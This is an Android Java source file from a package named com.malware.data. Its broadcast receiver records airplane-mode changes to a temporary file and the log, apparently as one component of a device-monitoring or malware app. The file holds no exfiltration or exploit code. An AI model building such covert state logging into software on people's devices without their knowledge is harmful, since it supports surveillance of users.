package com.malware.data;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.malware.service.MyService;

public class AirplaneReceiver extends BroadcastReceiver {
	
	private MyService service;

	private final String TAG = "AirplaneReceiver";
	private final boolean VERBOSE = true;
	
	public AirplaneReceiver(MyService service){
		this.service = service;
	}

	public void onReceive(Context context, Intent intent){
		String action = intent.getAction();
		Bundle extras = intent.getExtras();

		if(action.equals(Intent.ACTION_AIRPLANE_MODE_CHANGED)){
			boolean state = extras.getBoolean("state");
			
			service.addTextToFile((state ? "Mode avion ON" : "Mode avion OFF"),"tmp");
			if (VERBOSE) Log.v(TAG, (state ? "Mode avion ON" : "Mode avion OFF"));
		}
	}
}
